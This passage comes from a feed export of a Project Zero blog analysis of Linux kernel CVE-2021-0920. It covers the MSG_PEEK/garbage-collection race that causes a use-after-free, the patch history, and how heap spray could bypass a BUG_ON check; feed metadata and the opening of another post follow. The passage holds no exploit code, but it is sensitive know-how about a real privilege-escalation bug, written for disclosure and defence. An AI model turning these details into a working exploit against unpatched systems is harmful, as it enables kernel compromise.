 <p class="ykcrMYlEiJ-c22"><span>Stage2: </span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">0</span><span class="ykcrMYlEiJ-c11">0</span><span>, </span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">0</span><span class="ykcrMYlEiJ-c11">1</span><span>, </span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">1</span><span class="ykcrMYlEiJ-c11">0</span><span>, </span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">3</span><span class="ykcrMYlEiJ-c11">1</span><span>, </span><span class="ykcrMYlEiJ-c15">&#x1d6fc;</span><span class="ykcrMYlEiJ-c2">&nbsp;are garbage.</span></p></td><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c6"><span class="ykcrMYlEiJ-c2"></span></p></td><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c6"><span class="ykcrMYlEiJ-c2"></span></p></td></tr><tr class="ykcrMYlEiJ-c17"><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c22"><span class="ykcrMYlEiJ-c2">Stage2: start purging garbage.</span></p></td><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c6"><span class="ykcrMYlEiJ-c2"></span></p></td><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c6"><span class="ykcrMYlEiJ-c2"></span></p></td></tr><tr class="ykcrMYlEiJ-c17"><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c6"><span class="ykcrMYlEiJ-c2"></span></p></td><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c22"><span>Start calling </span><span class="ykcrMYlEiJ-c3">recvmsg</span><span>&nbsp;with </span><span class="ykcrMYlEiJ-c3">MSG_PEEK</span><span>&nbsp;flag from </span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">1</span><span class="ykcrMYlEiJ-c11">0</span><span>&rsquo;, which would expect to receive </span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">0</span><span class="ykcrMYlEiJ-c11">0</span><span class="ykcrMYlEiJ-c2">&#39;</span></p></td><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c6"><span class="ykcrMYlEiJ-c2"></span></p></td></tr><tr class="ykcrMYlEiJ-c17"><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c6"><span class="ykcrMYlEiJ-c2"></span></p></td><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c22"><span>Get </span><span class="ykcrMYlEiJ-c3">skb = skb_peek(&amp;sk-&gt;sk_receive_queue)</span><span>, </span><span class="ykcrMYlEiJ-c3">skb</span><span class="ykcrMYlEiJ-c2">&nbsp;is going to be freed by thread 0.</span></p></td><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c6"><span class="ykcrMYlEiJ-c2"></span></p></td></tr><tr class="ykcrMYlEiJ-c17"><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c22"><span>Stage2: for</span><span><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgRTVI1goYtLkJZYRh0P5Wj_jeCjDeIhbMLEzwbzMCMWdag6uBicpIv7TtDorvArzkMmQGMRq6Ss5WdVDwyKTZE9frPBY44fOF667d2D7rKxarcAfp9x9t-YrNRielyFYOgI0998OI0TplaeHW7CGyz4SAFs2udorAlUMxe4gaCPYqr2zP9AjmKbyip/s260/image18.png" border="0" alt="" style="max-height: 750px; max-width: 100px; box-shadow: none; --webkit-box-shadow: none; --moz-box-shadow: none; border:0; display: inline;" title="" />, calls </span><span class="ykcrMYlEiJ-c3">__skb_unlink</span><span>&nbsp;and </span><span class="ykcrMYlEiJ-c3">kfree_skb</span><span class="ykcrMYlEiJ-c2">&nbsp;later.</span></p></td><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c6"><span class="ykcrMYlEiJ-c2"></span></p></td><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c6"><span class="ykcrMYlEiJ-c2"></span></p></td></tr><tr class="ykcrMYlEiJ-c17"><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c6"><span class="ykcrMYlEiJ-c2"></span></p></td><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c22"><span class="ykcrMYlEiJ-c3">state-&gt;recv_actor(skb, skip, chunk, state)</span><span>&nbsp;</span><span class="c34 c19 c7 c39 c42">UAF</span></p></td><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c6"><span class="ykcrMYlEiJ-c2"></span></p></td></tr><tr class="ykcrMYlEiJ-c17"><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c22"><span class="ykcrMYlEiJ-c2">GC finished.</span></p></td><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c6"><span class="ykcrMYlEiJ-c2"></span></p></td><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c6"><span class="ykcrMYlEiJ-c2"></span></p></td></tr><tr class="ykcrMYlEiJ-c17"><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c6"><span class="ykcrMYlEiJ-c2"></span></p></td><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c6"><span class="ykcrMYlEiJ-c2"></span></p></td><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c22"><span class="ykcrMYlEiJ-c2">Start garbage collection.</span></p></td></tr><tr class="ykcrMYlEiJ-c17"><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c6"><span class="ykcrMYlEiJ-c2"></span></p></td><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c6"><span class="ykcrMYlEiJ-c2"></span></p></td><td class="ykcrMYlEiJ-c4" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c22"><span>Get </span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">1</span><span class="ykcrMYlEiJ-c11">0</span><span class="ykcrMYlEiJ-c2">&rsquo;&rsquo;</span></p></td></tr></table>
 <p class="ykcrMYlEiJ-c5"><span class="ykcrMYlEiJ-c2"></span></p>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c20"><span>Therefore, the race condition causes a UAF of the skb object. At first glance, we should blame the second </span><span class="ykcrMYlEiJ-c3">recvmsg</span><span>&nbsp;syscall because it clears </span><span class="ykcrMYlEiJ-c3">skb.fp</span><span>, the passed file list.</span><span>&nbsp;However, if the first </span><span class="ykcrMYlEiJ-c3">recvmsg</span><span>&nbsp;syscall doesn&rsquo;t set the </span><span class="ykcrMYlEiJ-c3">MSG_PEEK</span><span>&nbsp;flag, the UAF can be avoided because </span><span class="ykcrMYlEiJ-c3">unix_notinflight</span><span>&nbsp;is serialized with the garbage collection. In other words, the kernel makes sure the garbage collection is either not processed or finished before decrementing the inflight count and removing the skb. After </span><span class="ykcrMYlEiJ-c3">unix_notinflight</span><span>, the receiver obtains </span><span class="ykcrMYlEiJ-c8">f</span><span class="ykcrMYlEiJ-c15">1</span><span class="ykcrMYlEiJ-c11">1</span><span class="ykcrMYlEiJ-c2">&#39; and inflight sockets don&#39;t form an unbreakable cycle.</span></p>
 <p class="ykcrMYlEiJ-c5"><span class="ykcrMYlEiJ-c2"></span></p>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c20"><span>Since </span><span class="ykcrMYlEiJ-c3">MSG_PEEK</span><span>&nbsp;is not serialized with the garbage collection, when </span><span class="ykcrMYlEiJ-c3">recvmsg</span><span>&nbsp;is called with </span><span class="ykcrMYlEiJ-c3">MSG_PEEK</span><span>&nbsp;set, the kernel still considers </span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">1</span><span class="ykcrMYlEiJ-c11">1</span><span>&nbsp;as a garbage candidate. For this reason, the following next </span><span class="ykcrMYlEiJ-c3">recvmsg</span><span class="ykcrMYlEiJ-c2">&nbsp;will eventually trigger the bug due to the inconsistent state of the garbage collection process.</span></p>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c20"><span class="ykcrMYlEiJ-c2">&nbsp;</span></p><h1 class="ykcrMYlEiJ-c30 ykcrMYlEiJ-c20" id="h.wrjvlggcdxoy"><span class="ykcrMYlEiJ-c47 ykcrMYlEiJ-c39">Patch Analysis</span></h1><h2 class="ykcrMYlEiJ-c30 ykcrMYlEiJ-c20" id="h.de5p59plssty"><span class="ykcrMYlEiJ-c1">CVE-2021-0920 was found in 2016</span></h2>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c20"><span>The vulnerability was </span><span class="ykcrMYlEiJ-c9"><a class="ykcrMYlEiJ-c261" href="https://patchwork.ozlabs.org/project/netdev/patch/CAOssrKcfncAYsQWkfLGFgoOxAQJVT2hYVWdBA6Cw7hhO8RJ_wQ@mail.gmail.com/">initially reported to the Linux kernel community in 2016</a></span><span class="ykcrMYlEiJ-c2">. The researcher also provided the correct patch advice but it was not accepted by the Linux kernel community:</span></p>
 <p class="ykcrMYlEiJ-c31 ykcrMYlEiJ-c20"></p>
 <p class="ykcrMYlEiJ-c31 ykcrMYlEiJ-c20"><span class="ykcrMYlEiJ-c2"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh8WLJ5TaSrwBSyzsB2cnn3WlhRBqZzDHyOAnU8PWvMGr9d2l85FCYHw8fwiHRmFRMtPBMSe3kcFyISMGzuqmFyc0Ks5gJymqNPxh_kHdy59iHrUXTkpc5MTEyoOSroIHMzmqgQCibycvyxMRR-kUmjKIB3y0kqNHvN1TQULEUY8f04pIe65f-z3l3A/s1202/image65.png" style="display: block; padding: 1em 0;text-align: center;"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh8WLJ5TaSrwBSyzsB2cnn3WlhRBqZzDHyOAnU8PWvMGr9d2l85FCYHw8fwiHRmFRMtPBMSe3kcFyISMGzuqmFyc0Ks5gJymqNPxh_kHdy59iHrUXTkpc5MTEyoOSroIHMzmqgQCibycvyxMRR-kUmjKIB3y0kqNHvN1TQULEUY8f04pIe65f-z3l3A/s1202/image65.png" border="0" alt="Linux kernel developers: Why would I apply a patch that&#39;s an RFC, doesn&#39;t have a proper commit message, lacks a proper signoff, and also lacks ACK&#39;s and feedback from other knowledgable developers?" style="max-height: 750px; max-width: 600px;"title="Linux kernel developers: Why would I apply a patch that&#39;s an RFC, doesn&#39;t have a proper commit message, lacks a proper signoff, and also lacks ACK&#39;s and feedback from other knowledgable developers?" /></a></span></p>
 <p class="ykcrMYlEiJ-c31 ykcrMYlEiJ-c20"><span class="c34 c19 c32">Patch was not applied in 2016</span></p>
 <p class="ykcrMYlEiJ-c5"><span class="ykcrMYlEiJ-c2"></span></p>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c20"><span class="ykcrMYlEiJ-c2">In theory, anyone who saw this patch might come up with an exploit against the faulty garbage collector. </span></p>
 <p class="ykcrMYlEiJ-c5"><span class="ykcrMYlEiJ-c2"></span></p><h2 class="ykcrMYlEiJ-c30 ykcrMYlEiJ-c20" id="h.4z83prp6b89e"><span class="ykcrMYlEiJ-c41">Patch in 2021</span></h2>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c20"><span>Let&rsquo;s check the official </span><span class="ykcrMYlEiJ-c9"><a class="ykcrMYlEiJ-c261" href="https://lore.kernel.org/lkml/20210802134333.066918619@linuxfoundation.org/">patch</a></span><span>&nbsp;</span><span>for CVE-2021-0920. For the </span><span class="ykcrMYlEiJ-c3">MSG_PEEK</span><span>&nbsp;branch, it </span><span>requests the</span><span>&nbsp;garbage collection lock </span><span class="ykcrMYlEiJ-c3">unix_gc_lock</span><span>&nbsp;before performing sensitive actions</span><span class="ykcrMYlEiJ-c2">&nbsp;and immediately releases it afterwards:</span></p>
 <p class="ykcrMYlEiJ-c5"><span class="ykcrMYlEiJ-c2"></span></p><a id="t.35ff1e948ec741d79429e84cee5745d3afcaaae5"></a><a id="t.19"></a><table class="ykcrMYlEiJ-c33"><tr class="ykcrMYlEiJ-c17"><td class="ykcrMYlEiJ-c18" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c10">&hellip;</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c10">+</span><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp;spin_lock</span><span class="ykcrMYlEiJ-c10">(&amp;</span><span class="ykcrMYlEiJ-c0">unix_gc_lock</span><span class="ykcrMYlEiJ-c10">);</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c10">+</span><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp;spin_unlock</span><span class="ykcrMYlEiJ-c10">(&amp;</span><span class="ykcrMYlEiJ-c0">unix_gc_lock</span><span class="ykcrMYlEiJ-c10">);</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c10">&hellip;</span></p></td></tr></table>
 <p class="ykcrMYlEiJ-c5"><span class="ykcrMYlEiJ-c2"></span></p>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c20"><span>The patch is confusing - it&rsquo;s rare to see such lock usage in software development. Regardless, the </span><span class="ykcrMYlEiJ-c3">MSG_PEEK</span><span>&nbsp;flag now waits for the completion of the garbage collector, so the UAF issue is resolved.</span></p><h2 class="ykcrMYlEiJ-c30 ykcrMYlEiJ-c20" id="h.9ft0l34fnpmk"><span class="ykcrMYlEiJ-c41">BUG_ON Added in 2017</span></h2>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c20"><span>Andrey Ulanov from Google in 2017 found another issue in </span><span class="ykcrMYlEiJ-c3">unix_gc</span><span>&nbsp;and provided a fix </span><span class="ykcrMYlEiJ-c9"><a class="ykcrMYlEiJ-c261" href="https://lore.kernel.org/lkml/20170315031642.19576-1-andreyu@google.com/">commit</a></span><span>. Additionally, the patch added a </span><span class="ykcrMYlEiJ-c3">BUG_ON</span><span class="ykcrMYlEiJ-c2">&nbsp;for the inflight count:</span></p>
 <p class="ykcrMYlEiJ-c5"><span class="ykcrMYlEiJ-c2"></span></p><a id="t.9ddfb92c81bd3f8420f9ee8f3bc9bd197a02f533"></a><a id="t.20"></a><table class="ykcrMYlEiJ-c33"><tr class="ykcrMYlEiJ-c17"><td class="ykcrMYlEiJ-c18" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c14">void</span><span class="ykcrMYlEiJ-c0">&nbsp;unix_notinflight</span><span class="ykcrMYlEiJ-c10">(</span><span class="ykcrMYlEiJ-c14">struct</span><span class="ykcrMYlEiJ-c0">&nbsp;user_struct </span><span class="ykcrMYlEiJ-c10">*</span><span class="ykcrMYlEiJ-c0">user</span><span class="ykcrMYlEiJ-c10">,</span><span class="ykcrMYlEiJ-c0">&nbsp;</span><span class="ykcrMYlEiJ-c14">struct</span><span class="ykcrMYlEiJ-c0">&nbsp;file </span><span class="ykcrMYlEiJ-c10">*</span><span class="ykcrMYlEiJ-c0">fp</span><span class="ykcrMYlEiJ-c10">)</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="ykcrMYlEiJ-c14">if</span><span class="ykcrMYlEiJ-c0">&nbsp;</span><span class="ykcrMYlEiJ-c10">(</span><span class="ykcrMYlEiJ-c0">s</span><span class="ykcrMYlEiJ-c10">)</span><span class="ykcrMYlEiJ-c0">&nbsp;</span><span class="ykcrMYlEiJ-c10">{</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="ykcrMYlEiJ-c14">struct</span><span class="ykcrMYlEiJ-c0">&nbsp;unix_sock </span><span class="ykcrMYlEiJ-c10">*</span><span class="ykcrMYlEiJ-c0">u </span><span class="ykcrMYlEiJ-c10">=</span><span class="ykcrMYlEiJ-c0">&nbsp;unix_sk</span><span class="ykcrMYlEiJ-c10">(</span><span class="ykcrMYlEiJ-c0">s</span><span class="ykcrMYlEiJ-c10">);</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c13">&nbsp;</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c10">+</span><span class="ykcrMYlEiJ-c0">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; BUG_ON</span><span class="ykcrMYlEiJ-c10">(!</span><span class="ykcrMYlEiJ-c0">atomic_long_read</span><span class="ykcrMYlEiJ-c10">(&amp;</span><span class="ykcrMYlEiJ-c0">u</span><span class="ykcrMYlEiJ-c10">-&gt;</span><span class="ykcrMYlEiJ-c0">inflight</span><span class="ykcrMYlEiJ-c10">));</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; BUG_ON</span><span class="ykcrMYlEiJ-c10">(</span><span class="ykcrMYlEiJ-c0">list_empty</span><span class="ykcrMYlEiJ-c10">(&amp;</span><span class="ykcrMYlEiJ-c0">u</span><span class="ykcrMYlEiJ-c10">-&gt;</span><span class="ykcrMYlEiJ-c0">link</span><span class="ykcrMYlEiJ-c10">));</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c13">&nbsp;</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="ykcrMYlEiJ-c14">if</span><span class="ykcrMYlEiJ-c0">&nbsp;</span><span class="ykcrMYlEiJ-c10">(</span><span class="ykcrMYlEiJ-c0">atomic_long_dec_and_test</span><span class="ykcrMYlEiJ-c10">(&amp;</span><span class="ykcrMYlEiJ-c0">u</span><span class="ykcrMYlEiJ-c10">-&gt;</span><span class="ykcrMYlEiJ-c0">inflight</span><span class="ykcrMYlEiJ-c10">))</span></p></td></tr></table>
 <p class="ykcrMYlEiJ-c5"><span class="ykcrMYlEiJ-c2"></span></p>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c20"><span>At first glance, i</span><span>t seems that</span><span>&nbsp;the </span><span class="ykcrMYlEiJ-c3">BUG_ON</span><span>&nbsp;can prevent CVE-2021-0920 from being exploitable. However, if the exploit code can delay garbage collection by crafting a large amount of fake garbage, &nbsp;it can waive the </span><span class="ykcrMYlEiJ-c3">BUG_ON</span><span>&nbsp;check by heap spray.</span></p>
 <p class="ykcrMYlEiJ-c5"><span class="ykcrMYlEiJ-c2"></span></p><h2 class="ykcrMYlEiJ-c30 ykcrMYlEiJ-c20" id="h.f7eb84wuwvc6"><span class="ykcrMYlEiJ-c41">New Garbage Collection</span><span>&nbsp;</span><span class="ykcrMYlEiJ-c41">Discovered </span><span>in 2021</span></h2>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c20"><span>CVE-2021-4083 deserves an honorable mention: when I </span><span>discussed</span><span>&nbsp;CVE-2021-0920 with Jann Horn and Ben Hawkes, Jann found another </span><span class="ykcrMYlEiJ-c9"><a class="ykcrMYlEiJ-c261" href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2247">issue</a></span><span>&nbsp;in the garbage collection, described in the Project Zero blog post </span><span class="ykcrMYlEiJ-c9"><a class="ykcrMYlEiJ-c261" href="https://googleprojectzero.blogspot.com/2022/03/racing-against-clock-hitting-tiny.html">Racing against the clock -- hitting a tiny kernel race window</a></span><span class="ykcrMYlEiJ-c2">.</span></p>
 \<h1 class="ykcrMYlEiJ-c30 ykcrMYlEiJ-c20" id="h.4yx7dnb7u7k1"><span class="ykcrMYlEiJ-c36 ykcrMYlEiJ-c34">Part I Conclusion</span></h1>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c20"><span class="ykcrMYlEiJ-c28">To recap, we have discussed the kernel internals of </span><span class="ykcrMYlEiJ-c3 ykcrMYlEiJ-c28">SCM_RIGHTS</span><span class="ykcrMYlEiJ-c28">&nbsp;and the designs and implementations of the Linux kernel garbage collector. Besides, we have analyzed the behavior of </span><span class="ykcrMYlEiJ-c3 ykcrMYlEiJ-c28">MSG_PEEK</span><span class="ykcrMYlEiJ-c28">&nbsp;flag with the </span><span class="ykcrMYlEiJ-c3 ykcrMYlEiJ-c28">recvmsg</span><span class="ykcrMYlEiJ-c2 ykcrMYlEiJ-c28">&nbsp;syscall and how it leads to a kernel UAF by a subtle and arcane race condition.</span></p>
 <p class="ykcrMYlEiJ-c5"><span class="ykcrMYlEiJ-c2 ykcrMYlEiJ-c28"></span></p>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c20"><span class="ykcrMYlEiJ-c28">The bug was spotted in 2016 publicly, but unfortunately the Linux kernel community did not accept the patch at that time. Any threat actors who saw the public email thread may have a chance to develop an LPE exploit against the Linux kernel.</span></p>
 <p class="ykcrMYlEiJ-c5"><span class="ykcrMYlEiJ-c2"></span></p>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c20"><span>In part two, we&#39;ll look at how the vulnerability was exploited and the functionalities of the post compromise modules.</span></p>
## link
## -
## @rel
replies
## @type
application/atom+xml
## @href
https://googleprojectzero.blogspot.com/feeds/6481767562526230244/comments/default
## @title
Post Comments
## -
## @rel
replies
## @type
text/html
## @href
https://googleprojectzero.blogspot.com/2022/08/the-quantum-state-of-linux-kernel.html#comment-form
## @title
0 Comments
## -
## @rel
edit
## @type
application/atom+xml
## @href
https://www.blogger.com/feeds/4838136820032157985/posts/default/6481767562526230244
## -
## @rel
self
## @type
application/atom+xml
## @href
https://www.blogger.com/feeds/4838136820032157985/posts/default/6481767562526230244
## -
## @rel
alternate
## @type
text/html
## @href
https://googleprojectzero.blogspot.com/2022/08/the-quantum-state-of-linux-kernel.html
## @title
The quantum state of Linux kernel garbage collection CVE-2021-0920 (Part I)
## author
## name
Google Project Zero
## uri
http://www.blogger.com/profile/08975904405228580347
## email
noreply@blogger.com
## gd:image
## @rel
http://schemas.google.com/g/2005#thumbnail
## @width
16
## @height
16
## @src
https://img1.blogblog.com/img/b16-rounded.gif
## media:thumbnail
## @xmlns:media
http://search.yahoo.com/mrss/
## @url
https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgNWAkA0RVb4goO21_FhJOVV-LSNTfbXV7GKoqH-CUrdMTpDcNUSQxEssrnAVGxC50aK-Z3HfIWeDyCgkr6lb5-a1Ha9Km5ppaHeBzWmLj8NTmZtUjx8J-VzzM1O7mYdjOfw2ErddrslDXw6rDZrs0g1DEC1Ya4VAbkLKKEhZgNPeiSefH-xpv3zDa8/s72-c/image71.png
## @height
72
## @width
72
## thr:total
0
## -
## id
tag:blogger.com,1999:blog-4838136820032157985.post-256978548158816980
## published
30/06/2022 10:00:00
## updated
30/06/2022 10:00:00
## title
## @type
text
## #text
2022 0-day In-the-Wild Exploitationso far
## content
## @type
html
## #text
<style type="text/css">ul.lst-kix_68660h7uawx-0{list-style-type:none}ul.lst-kix_68660h7uawx-1{list-style-type:none}ul.lst-kix_68660h7uawx-2{list-style-type:none}ul.lst-kix_68660h7uawx-3{list-style-type:none}ul.lst-kix_68660h7uawx-4{list-style-type:none}ul.lst-kix_68660h7uawx-5{list-style-type:none}ul.lst-kix_68660h7uawx-6{list-style-type:none}.lst-kix_68660h7uawx-7>li:before{content:"\0025cb  "}ul.lst-kix_68660h7uawx-7{list-style-type:none}ul.lst-kix_68660h7uawx-8{list-style-type:none}.lst-kix_68660h7uawx-0>li:before{content:"\0025cf  "}.lst-kix_68660h7uawx-6>li:before{content:"\0025cf  "}.lst-kix_68660h7uawx-8>li:before{content:"\0025a0  "}li.li-bullet-0:before{margin-left:-18pt;white-space:nowrap;display:inline-block;min-width:18pt}.lst-kix_68660h7uawx-3>li:before{content:"\0025cf  "}.lst-kix_68660h7uawx-2>li:before{content:"\0025a0  "}.lst-kix_68660h7uawx-4>li:before{content:"\0025cb  "}.lst-kix_68660h7uawx-1>li:before{content:"\0025cb  "}.lst-kix_68660h7uawx-5>li:before{content:"\0025a0  "}ol{margin:0;padding:0}table td,table th{padding:0}.HZWKYxoXby-c2{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:156.8pt;border-top-color:#000000;border-bottom-style:solid}.HZWKYxoXby-c9{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:155.2pt;border-top-color:#000000;border-bottom-style:solid}.HZWKYxoXby-c3{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:156pt;border-top-color:#000000;border-bottom-style:solid}.HZWKYxoXby-c19{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:8pt;font-family:"Arial";font-style:normal}.HZWKYxoXby-c15{color:#000000;font-weight:700;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Arial";font-style:normal}.HZWKYxoXby-c5{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Arial";font-style:normal}.HZWKYxoXby-c4{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left;height:11pt}.HZWKYxoXby-c6{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left}.HZWKYxoXby-c12{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Arial"}.HZWKYxoXby-c17{border-spacing:0;border-collapse:collapse;margin-right:auto}.HZWKYxoXby-c0{padding-top:0pt;padding-bottom:0pt;line-height:1.0;text-align:left}.HZWKYxoXby-c1{text-decoration-skip-ink:none;-webkit-text-decoration-skip:none;color:#1155cc;text-decoration:underline}.HZWKYxoXby-c14{background-color:#ffffff;max-width:468pt;padding:72pt 72pt 72pt 72pt}.HZWKYxoXby-c18{margin-left:36pt;padding-left:0pt}.HZWKYxoXby-c8{color:inherit;text-decoration:inherit}.HZWKYxoXby-c13{padding:0;margin:0}.HZWKYxoXby-c21{font-weight:700}.HZWKYxoXby-c7{height:0pt}.HZWKYxoXby-c20{margin-left:36pt}.HZWKYxoXby-c11{height:11pt}.HZWKYxoXby-c16{margin-left:72pt}.HZWKYxoXby-c10{font-style:italic}.title{padding-top:0pt;color:#000000;font-size:26pt;padding-bottom:3pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.subtitle{padding-top:0pt;color:#666666;font-size:15pt;padding-bottom:16pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}li{color:#000000;font-size:11pt;font-family:"Arial"}p{margin:0;color:#000000;font-size:11pt;font-family:"Arial"}h1{padding-top:20pt;color:#000000;font-size:20pt;padding-bottom:6pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h2{padding-top:18pt;color:#000000;font-size:16pt;padding-bottom:6pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h3{padding-top:16pt;color:#434343;font-size:14pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h4{padding-top:14pt;color:#666666;font-size:12pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h5{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h6{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:left}</style></head><body class="c14 doc-content">
 <p class="HZWKYxoXby-c6"><span class="HZWKYxoXby-c5">Posted by Maddie Stone, Google Project Zero</span></p>
 <p class="HZWKYxoXby-c4"><span class="HZWKYxoXby-c5"></span></p>
